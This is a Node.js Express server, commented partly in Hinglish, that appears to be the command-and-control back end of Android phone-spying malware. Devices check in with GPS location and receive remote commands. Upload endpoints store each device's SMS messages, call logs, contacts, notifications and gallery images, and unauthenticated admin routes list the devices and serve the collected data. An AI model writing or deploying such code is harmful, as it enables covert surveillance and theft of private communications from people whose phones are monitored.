const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let devicesStatus = {}; 

// --- 1. ADMIN: Get All Devices (Ye miss tha, isliye dashboard khali tha) ---
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// --- 2. PHONE SIDE: Update Status & Get Commands ---
app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging, lat, lon } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID provided" });

    const id = device_id.toString().trim().toUpperCase();
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    devicesStatus[id] = {
        ...devicesStatus[id], 
        id: id,
        model: model || devicesStatus[id]?.model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lat: lat || devicesStatus[id]?.lat || 0,
        lon: lon || devicesStatus[id]?.lon || 0,
        lastSeen: Date.now(),
        command: "none" // Command pick hone ke baad reset
    };

    res.json({ status: "success", command: pendingCommand });
});

// --- 3. ADMIN: Send Command (Sound Fix Included) ---
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Command" });
    
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
    
    // SOUND FIX: Agar dashboard 'normal' bhejta hai, toh use 'loud' mein badal do taaki Android samajh sake
    let finalCommand = command;
    if (command === "normal") finalCommand = "loud";

    devicesStatus[id].command = finalCommand;
    console.log(`🚀 [CMD] ${finalCommand} -> ${id}`);
    res.json({ status: "success" });
});

// --- 4. UPLOAD DATA HANDLING ---
app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            if(devicesStatus[id]) {
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude;
            }
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
        } 
        else if (['notifications', 'sms', 'call_logs', 'contacts'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData].slice(0, 1000);
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        } 
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);

    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) {
            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        galleryData.unshift({ time: date || new Date().toLocaleString(), image: image_data });
        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ error: "error" });
    }
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
